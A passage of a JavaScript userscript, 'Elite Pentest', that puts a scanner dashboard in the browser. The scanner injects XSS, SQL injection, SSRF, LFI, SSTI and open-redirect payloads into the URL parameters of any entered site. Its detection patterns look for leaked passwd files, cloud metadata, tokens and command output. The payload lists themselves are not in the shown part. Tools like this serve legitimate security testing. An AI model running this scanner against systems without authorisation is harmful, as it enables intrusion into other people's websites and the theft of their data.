          testUrl.searchParams.set(parameter, processedPayload);

          // Make request
          const response = await this.analyzer.makeRequest(testUrl.toString());

          // Analyze response
          const analysis = this.analyzer.analyzeResponse(response, processedPayload, 'xss', this.baseline);

          if (analysis.vulnerable) {
            vulnerabilities.push({
              type: 'XSS',
              parameter: parameter,
              payload: processedPayload,
              confidence: analysis.confidence,
              evidence: analysis.evidence,
              url: testUrl.toString(),
              context: context,
              indicators: analysis.indicators
            });

            console.log(`[XSS] ✓ Vulnerability found! Confidence: ${analysis.confidence}%`);
          }

          await this.sleep(CONFIG.TESTING.PAYLOAD_DELAY);
        } catch (error) {
          console.error(`[XSS] Error testing payload:`, error);
        }
      }

      return vulnerabilities;
    }

    async scanSQLi(url, parameter) {
      console.log(`[SQLi] Scanning ${parameter}...`);

      const vulnerabilities = [];
      const techniques = ['error_based', 'time_based', 'boolean_based', 'union_based'];

      for (const technique of techniques) {
        if (!CONFIG.VECTORS.SQLI) break;

        const payloads = PAYLOADS.SQLI[technique] || [];

        for (const payload of payloads) {
          try {
            const testUrl = new URL(url);
            testUrl.searchParams.set(parameter, payload);

            const response = await this.analyzer.makeRequest(testUrl.toString());

            // Special handling for time-based
            if (technique === 'time_based') {
              if (response.time >= CONFIG.TESTING.BLIND_DELAY_THRESHOLD) {
                // Verify with second request
                const verifyResponse = await this.analyzer.makeRequest(testUrl.toString());
                
                if (verifyResponse.time >= CONFIG.TESTING.BLIND_DELAY_THRESHOLD) {
                  vulnerabilities.push({
                    type: 'SQLi',
                    subtype: 'Time-based Blind',
                    parameter: parameter,
                    payload: payload,
                    confidence: 90,
                    evidence: [`Consistent delay: ${response.time}ms, ${verifyResponse.time}ms`],
                    url: testUrl.toString()
                  });

                  console.log(`[SQLi] ✓ Time-based blind SQLi found! Delay: ${response.time}ms`);
                }
              }
            } else {
              const analysis = this.analyzer.analyzeResponse(response, payload, 'sqli', this.baseline);

              if (analysis.vulnerable) {
                vulnerabilities.push({
                  type: 'SQLi',
                  subtype: technique.replace('_', ' ').toUpperCase(),
                  parameter: parameter,
                  payload: payload,
                  confidence: analysis.confidence,
                  evidence: analysis.evidence,
                  url: testUrl.toString(),
                  indicators: analysis.indicators
                });

                console.log(`[SQLi] ✓ ${technique} SQLi found! Confidence: ${analysis.confidence}%`);
              }
            }

            await this.sleep(CONFIG.TESTING.PAYLOAD_DELAY);
          } catch (error) {
            console.error(`[SQLi] Error testing payload:`, error);
          }
        }
      }

      return vulnerabilities;
    }

    async scanSSRF(url, parameter) {
      console.log(`[SSRF] Scanning ${parameter}...`);

      const vulnerabilities = [];
      const payloads = [...PAYLOADS.SSRF.basic, ...PAYLOADS.SSRF.bypass];

      for (const payload of payloads) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(parameter, payload);

          const response = await this.analyzer.makeRequest(testUrl.toString());

          // Check for SSRF indicators
          const indicators = [
            { pattern: /169\.254\.169\.254/i, desc: 'Cloud metadata access' },
            { pattern: /ami-\w+/i, desc: 'AWS metadata' },
            { pattern: /"access_token":/i, desc: 'Token in response' },
            { pattern: /root:.*?:0:0:/i, desc: 'File read via SSRF' },
            { pattern: /\[boot loader\]/i, desc: 'Windows file read' }
          ];

          let confidence = 0;
          const evidence = [];

          for (const indicator of indicators) {
            if (indicator.pattern.test(response.body)) {
              confidence += 30;
              evidence.push(indicator.desc);
            }
          }

          // Check if response differs significantly from baseline
          if (this.baseline) {
            const diff = this.analyzer.calculateContentDifference(response.body, this.baseline.body);
            if (diff.significant) {
              confidence += 20;
              evidence.push(`Content diff: ${diff.percentage}%`);
            }
          }

          if (confidence >= CONFIG.TESTING.CONFIDENCE_THRESHOLD) {
            vulnerabilities.push({
              type: 'SSRF',
              parameter: parameter,
              payload: payload,
              confidence: confidence,
              evidence: evidence,
              url: testUrl.toString()
            });

            console.log(`[SSRF] ✓ SSRF vulnerability found! Confidence: ${confidence}%`);
          }

          await this.sleep(CONFIG.TESTING.PAYLOAD_DELAY);
        } catch (error) {
          console.error(`[SSRF] Error testing payload:`, error);
        }
      }

      return vulnerabilities;
    }

    async scanLFI(url, parameter) {
      console.log(`[LFI] Scanning ${parameter}...`);

      const vulnerabilities = [];
      const payloadSets = [
        PAYLOADS.LFI.basic,
        PAYLOADS.LFI.encoded,
        PAYLOADS.LFI.wrappers
      ];

      for (const payloads of payloadSets) {
        for (const payload of payloads) {
          try {
            const testUrl = new URL(url);
            testUrl.searchParams.set(parameter, payload);

            const response = await this.analyzer.makeRequest(testUrl.toString());

            // Check for LFI indicators
            const indicators = [
              { pattern: /root:.*?:0:0:/i, score: 50, desc: 'Unix passwd file' },
              { pattern: /\[boot loader\]/i, score: 50, desc: 'Windows boot.ini' },
              { pattern: /\[fonts\]/i, score: 40, desc: 'Windows win.ini' },
              { pattern: /<\?php/i, score: 35, desc: 'PHP source code' },
              { pattern: /mysql_connect/i, score: 30, desc: 'Database config' }
            ];

            let confidence = 0;
            const evidence = [];

            for (const indicator of indicators) {
              if (indicator.pattern.test(response.body)) {
                confidence += indicator.score;
                evidence.push(indicator.desc);
              }
            }

            if (confidence >= CONFIG.TESTING.CONFIDENCE_THRESHOLD) {
              vulnerabilities.push({
                type: 'LFI',
                parameter: parameter,
                payload: payload,
                confidence: Math.min(confidence, 100),
                evidence: evidence,
                url: testUrl.toString()
              });

              console.log(`[LFI] ✓ LFI vulnerability found! Confidence: ${confidence}%`);
            }

            await this.sleep(CONFIG.TESTING.PAYLOAD_DELAY);
          } catch (error) {
            console.error(`[LFI] Error testing payload:`, error);
          }
        }
      }

      return vulnerabilities;
    }

    async scanOpenRedirect(url, parameter) {
      console.log(`[REDIRECT] Scanning ${parameter}...`);

      const vulnerabilities = [];

      for (const payload of PAYLOADS.OPEN_REDIRECT) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(parameter, payload);

          const response = await this.analyzer.makeRequest(testUrl.toString());

          // Check for redirect
          if (response.status >= 300 && response.status < 400) {
            const location = response.headers.match(/location:\s*(.+)/i);
            if (location && location[1]) {
              const redirectUrl = location[1].trim();
              
              // Check if redirect is to our payload
              if (redirectUrl.includes('attacker.com') || redirectUrl.includes('google.com')) {
                vulnerabilities.push({
                  type: 'Open Redirect',
                  parameter: parameter,
                  payload: payload,
                  confidence: 95,
                  evidence: [`Redirects to: ${redirectUrl}`],
                  url: testUrl.toString()
                });

                console.log(`[REDIRECT] ✓ Open redirect found! Redirects to: ${redirectUrl}`);
              }
            }
          }

          await this.sleep(CONFIG.TESTING.PAYLOAD_DELAY);
        } catch (error) {
          console.error(`[REDIRECT] Error testing payload:`, error);
        }
      }

      return vulnerabilities;
    }

    async scanSSTI(url, parameter) {
      console.log(`[SSTI] Scanning ${parameter}...`);

      const vulnerabilities = [];
      const engines = ['jinja2', 'freemarker', 'velocity', 'thymeleaf'];

      for (const engine of engines) {
        const payloads = PAYLOADS.SSTI[engine] || [];

        for (const payload of payloads) {
          try {
            const testUrl = new URL(url);
            testUrl.searchParams.set(parameter, payload);

            const response = await this.analyzer.makeRequest(testUrl.toString());

            // Check for template execution
            let confirmed = false;
            let evidence = [];

            // Check for mathematical expression evaluation
            if (payload.includes('7*7') && response.body.includes('49')) {
              confirmed = true;
              evidence.push('Mathematical expression evaluated (7*7=49)');
            }

            // Check for error messages
            const errorCheck = this.analyzer.checkErrorSignatures(response.body, 'ssti');
            if (errorCheck.found) {
              confirmed = true;
              evidence.push(...errorCheck.matches);
            }

            // Check for command output
            if (response.body.match(/uid=\d+\([^)]+\)/)) {
              confirmed = true;
              evidence.push('Command execution confirmed');
            }

            if (confirmed) {
              vulnerabilities.push({
                type: 'SSTI',
                engine: engine,
                parameter: parameter,
                payload: payload,
                confidence: 90,
                evidence: evidence,
                url: testUrl.toString()
              });

              console.log(`[SSTI] ✓ ${engine} SSTI found!`);
            }

            await this.sleep(CONFIG.TESTING.PAYLOAD_DELAY);
          } catch (error) {
            console.error(`[SSTI] Error testing payload:`, error);
          }
        }
      }

      return vulnerabilities;
    }

    async fullScan(url, parameters) {
      console.log(`[SCANNER] Starting full scan of ${url}`);
      console.log(`[SCANNER] Testing ${parameters.length} parameters`);

      await this.initialize(url);

      const allVulnerabilities = [];

      for (const param of parameters) {
        console.log(`\n[SCANNER] Testing parameter: ${param}`);

        try {
          // XSS
          if (CONFIG.VECTORS.XSS) {
            const xssVulns = await this.scanXSS(url, param);
            allVulnerabilities.push(...xssVulns);
          }

          // SQLi
          if (CONFIG.VECTORS.SQLI) {
            const sqliVulns = await this.scanSQLi(url, param);
            allVulnerabilities.push(...sqliVulns);
          }

          // SSRF
          if (CONFIG.VECTORS.SSRF) {
            const ssrfVulns = await this.scanSSRF(url, param);
            allVulnerabilities.push(...ssrfVulns);
          }

          // LFI
          if (CONFIG.VECTORS.LFI) {
            const lfiVulns = await this.scanLFI(url, param);
            allVulnerabilities.push(...lfiVulns);
          }

          // Open Redirect
          if (CONFIG.VECTORS.OPEN_REDIRECT) {
            const redirectVulns = await this.scanOpenRedirect(url, param);
            allVulnerabilities.push(...redirectVulns);
          }

          // SSTI
          if (CONFIG.VECTORS.SSTI) {
            const sstiVulns = await this.scanSSTI(url, param);
            allVulnerabilities.push(...sstiVulns);
          }

        } catch (error) {
          console.error(`[SCANNER] Error scanning parameter ${param}:`, error);
        }
      }

      this.results = allVulnerabilities;

      console.log(`\n[SCANNER] Scan complete! Found ${allVulnerabilities.length} vulnerabilities`);
      this.printReport();

      return allVulnerabilities;
    }

    printReport() {
      console.log('\n╔══════════════════════════════════════════════════════════════╗');
      console.log('║              VULNERABILITY SCAN REPORT                       ║');
      console.log('╚══════════════════════════════════════════════════════════════╝\n');

      if (this.results.length === 0) {
        console.log('✓ No vulnerabilities found');
        return;
      }

      // Group by type
      const grouped = this.results.reduce((acc, vuln) => {
        acc[vuln.type] = acc[vuln.type] || [];
        acc[vuln.type].push(vuln);
        return acc;
      }, {});

      for (const [type, vulns] of Object.entries(grouped)) {
        console.log(`\n[${type}] Found ${vulns.length} vulnerability(ies)`);
        console.log('─'.repeat(60));

        vulns.forEach((vuln, index) => {
          console.log(`\n${index + 1}. Parameter: ${vuln.parameter}`);
          console.log(`   Confidence: ${vuln.confidence}%`);
          console.log(`   Payload: ${vuln.payload.substring(0, 80)}${vuln.payload.length > 80 ? '...' : ''}`);
          console.log(`   URL: ${vuln.url.substring(0, 80)}...`);
          if (vuln.evidence && vuln.evidence.length > 0) {
            console.log(`   Evidence:`);
            vuln.evidence.forEach(e => console.log(`     - ${e}`));
          }
        });
      }

      console.log('\n' + '═'.repeat(60) + '\n');
    }

    exportResults(format = 'json') {
      if (format === 'json') {
        return JSON.stringify(this.results, null, 2);
      } else if (format === 'csv') {
        let csv = 'Type,Parameter,Payload,Confidence,URL\n';
        this.results.forEach(r => {
          csv += `${r.type},${r.parameter},"${r.payload}",${r.confidence},${r.url}\n`;
        });
        return csv;
      }
    }

    sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }
  }

  // ════════════════════════════════════════════════════════════════════════════
  // 🎨 DASHBOARD UI
  // ════════════════════════════════════════════════════════════════════════════

  class Dashboard {
    constructor() {
      this.scanner = new VulnerabilityScanner();
      this.isVisible = false;
    }

    create() {
      const dashboard = document.createElement('div');
      dashboard.id = 'elite-dashboard';
      dashboard.innerHTML = `
        <style>
          #elite-dashboard {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 400px;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            border: 2px solid #4a90e2;
            border-radius: 10px;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            z-index: 999999;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            display: none;
          }

          #elite-dashboard.visible {
            display: block;
          }

          .elite-header {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            cursor: move;
            display: flex;
            justify-content: space-between;
            align-items: center;
          }

          .elite-title {
            font-size: 18px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
          }

          .elite-close {
            cursor: pointer;
            font-size: 24px;
            line-height: 1;
            opacity: 0.8;
          }

          .elite-close:hover {
            opacity: 1;
          }

          .elite-body {
            padding: 20px;
            max-height: 600px;
            overflow-y: auto;
          }

          .elite-section {
            margin-bottom: 20px;
          }

          .elite-section-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #4af;
          }

          .elite-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
            transition: transform 0.2s;
          }

          .elite-button:hover {
            transform: scale(1.05);
          }

          .elite-button:active {
            transform: scale(0.95);
          }

          .elite-input {
            width: 100%;
            padding: 8px;
            border-radius: 5px;
            border: 1px solid rgba(255,255,255,0.2);
            background: rgba(255,255,255,0.1);
            color: white;
            margin: 5px 0;
          }

          .elite-checkbox {
            margin-right: 5px;
          }

          .elite-label {
            display: block;
            margin: 10px 0;
          }

          .elite-results {
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 5px;
            max-height: 300px;
            overflow-y: auto;
            font-size: 12px;
          }

          .elite-vuln {
            background: rgba(255,0,0,0.2);
            padding: 10px;
            margin: 5px 0;
            border-left: 3px solid #f00;
            border-radius: 3px;
          }

          .elite-vuln-type {
            font-weight: bold;
            color: #ff6b6b;
          }

          .elite-confidence {
            color: #4ecdc4;
          }
        </style>

        <div class="elite-header">
          <div class="elite-title">🛡️ Elite Pentest v${CONFIG.VERSION}</div>
          <div class="elite-close" id="elite-close">×</div>
        </div>

        <div class="elite-body">
          <div class="elite-section">
            <div class="elite-section-title">🎯 Quick Scan</div>
            <input type="text" class="elite-input" id="elite-url" placeholder="Enter URL to scan" value="${window.location.href}">
            <input type="text" class="elite-input" id="elite-params" placeholder="Parameters (comma-separated)" value="">
            <button class="elite-button" id="elite-scan-btn">🚀 Start Scan</button>
            <button class="elite-button" id="elite-auto-detect-btn">🔍 Auto-Detect Params</button>
          </div>

          <div class="elite-section">
            <div class="elite-section-title">⚙️ Attack Vectors</div>
            <label class="elite-label">
              <input type="checkbox" class="elite-checkbox" id="vec-xss" checked> XSS
            </label>
            <label class="elite-label">
              <input type="checkbox" class="elite-checkbox" id="vec-sqli" checked> SQL Injection
            </label>
            <label class="elite-label">
              <input type="checkbox" class="elite-checkbox" id="vec-ssrf"> SSRF
            </label>
            <label class="elite-label">
              <input type="checkbox" class="elite-checkbox" id="vec-lfi"> LFI
            </label>
            <label class="elite-label">
              <input type="checkbox" class="elite-checkbox" id="vec-ssti"> SSTI
            </label>
            <label class="elite-label">
              <input type="checkbox" class="elite-checkbox" id="vec-redirect"> Open Redirect
            </label>
          </div>

          <div class="elite-section">
            <div class="elite-section-title">📊 Results</div>
            <div class="elite-results" id="elite-results">
              No scan results yet. Click "Start Scan" to begin.
            </div>
          </div>

          <div class="elite-section">
            <button class="elite-button" id="elite-export-json">💾 Export JSON</button>
            <button class="elite-button" id="elite-export-csv">📄 Export CSV</button>
            <button class="elite-button" id="elite-clear-results">🗑️ Clear Results</button>
          </div>
        </div>
      `;

      document.body.appendChild(dashboard);

      // Make draggable
      this.makeDraggable(dashboard);

      // Event listeners
      document.getElementById('elite-close').addEventListener('click', () => {
        this.toggle();
      });

      document.getElementById('elite-scan-btn').addEventListener('click', () => {
        this.startScan();
      });

      document.getElementById('elite-auto-detect-btn').addEventListener('click', () => {
        this.autoDetectParams();
      });

      document.getElementById('elite-export-json').addEventListener('click', () => {
        this.exportResults('json');
      });

      document.getElementById('elite-export-csv').addEventListener('click', () => {
        this.exportResults('csv');
      });

      document.getElementById('elite-clear-results').addEventListener('click', () => {
        this.clearResults();
      });

      // Keyboard shortcut: Ctrl+Shift+E
      document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && e.key === 'E') {
          this.toggle();
        }
      });

      console.log('[ELITE] Dashboard created. Press Ctrl+Shift+E to toggle.');
    }

    toggle() {
      const dashboard = document.getElementById('elite-dashboard');
      if (dashboard) {
        this.isVisible = !this.isVisible;
        dashboard.classList.toggle('visible', this.isVisible);
      }
    }

    makeDraggable(element) {
      let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
      const header = element.querySelector('.elite-header');

      header.onmousedown = dragMouseDown;

      function dragMouseDown(e) {
        e.preventDefault();
        pos3 = e.clientX;
        pos4 = e.clientY;
        document.onmouseup = closeDragElement;
        document.onmousemove = elementDrag;
      }

      function elementDrag(e) {
        e.preventDefault();
        pos1 = pos3 - e.clientX;
        pos2 = pos4 - e.clientY;
        pos3 = e.clientX;
        pos4 = e.clientY;
        element.style.top = (element.offsetTop - pos2) + "px";
        element.style.left = (element.offsetLeft - pos1) + "px";
      }

      function closeDragElement() {
        document.onmouseup = null;
        document.onmousemove = null;
      }
    }

    autoDetectParams() {
      const url = new URL(window.location.href);
      const params = Array.from(url.searchParams.keys());
      
      if (params.length > 0) {
        document.getElementById('elite-params').value = params.join(', ');
        console.log(`[ELITE] Auto-detected ${params.length} parameters: ${params.join(', ')}`);
      } else {
        console.log('[ELITE] No parameters found in current URL');
        alert('No parameters found in current URL');
      }
    }

    async startScan() {
      const url = document.getElementById('elite-url').value;
      const paramsInput = document.getElementById('elite-params').value;
      
      if (!url || !paramsInput) {
        alert('Please enter URL and parameters');
        return;
      }

      const params = paramsInput.split(',').map(p => p.trim());

      // Update config based on checkboxes
      CONFIG.VECTORS.XSS = document.getElementById('vec-xss').checked;
      CONFIG.VECTORS.SQLI = document.getElementById('vec-sqli').checked;
      CONFIG.VECTORS.SSRF = document.getElementById('vec-ssrf').checked;
      CONFIG.VECTORS.LFI = document.getElementById('vec-lfi').checked;
      CONFIG.VECTORS.SSTI = document.getElementById('vec-ssti').checked;
      CONFIG.VECTORS.OPEN_REDIRECT = document.getElementById('vec-redirect').checked;

      const resultsDiv = document.getElementById('elite-results');
      resultsDiv.innerHTML = '<div style="text-align:center;padding:20px;">🔄 Scanning in progress...</div>';

      try {
        const vulnerabilities = await this.scanner.fullScan(url, params);
        this.displayResults(vulnerabilities);
      } catch (error) {
        resultsDiv.innerHTML = `<div style="color:#f00;">Error: ${error.message}</div>`;
        console.error('[ELITE] Scan error:', error);
      }
    }

    displayResults(vulnerabilities) {
      const resultsDiv = document.getElementById('elite-results');
      
      if (vulnerabilities.length === 0) {
        resultsDiv.innerHTML = '<div style="text-align:center;color:#4f4;">✓ No vulnerabilities found</div>';
        return;
      }

      let html = `<div style="margin-bottom:10px;font-weight:bold;color:#ff6b6b;">⚠️ Found ${vulnerabilities.length} vulnerability(ies)</div>`;

      vulnerabilities.forEach((vuln, index) => {
        html += `
          <div class="elite-vuln">
            <div><span class="elite-vuln-type">${vuln.type}</span> ${vuln.subtype ? `(${vuln.subtype})` : ''}</div>
            <div>Parameter: <strong>${vuln.parameter}</strong></div>
            <div class="elite-confidence">Confidence: ${vuln.confidence}%</div>
            <div style="margin-top:5px;font-size:11px;opacity:0.8;">
              Payload: <code>${this.escapeHtml(vuln.payload.substring(0, 60))}${vuln.payload.length > 60 ? '...' : ''}</code>
            </div>
            ${vuln.evidence && vuln.evidence.length > 0 ? `
              <div style="margin-top:5px;font-size:11px;">
                Evidence: ${vuln.evidence.slice(0, 2).map(e => this.escapeHtml(e.substring(0, 80))).join('; ')}
              </div>
            ` : ''}
          </div>
        `;
      });

      resultsDiv.innerHTML = html;
    }

    escapeHtml(text) {
      const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
      };
      return text.replace(/[&<>"']/g, m => map[m]);
    }

    exportResults(format) {
      if (this.scanner.results.length === 0) {
        alert('No results to export');
        return;
      }

      const data = this.scanner.exportResults(format);
      const filename = `elite-scan-${Date.now()}.${format}`;
      
      GM_download({
        url: 'data:text/plain;charset=utf-8,' + encodeURIComponent(data),
        name: filename,
        saveAs: true
      });

      console.log(`[ELITE] Results exported to ${filename}`);
    }

    clearResults() {
      this.scanner.results = [];
      document.getElementById('elite-results').innerHTML = 'Results cleared.';
    }
  }

  // ════════════════════════════════════════════════════════════════════════════
  // 🚀 INITIALIZATION
  // ════════════════════════════════════════════════════════════════════════════

  function init() {
    console.log(`[ELITE] Advanced Pentest Framework v${CONFIG.VERSION} loaded`);
    console.log('[ELITE] Press Ctrl+Shift+E to open dashboard');

    // Wait for page load
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => {
        const dashboard = new Dashboard();
        dashboard.create();
      });
    } else {
      const dashboard = new Dashboard();
      dashboard.create();
    }
  }

  // Start
  init();

})();
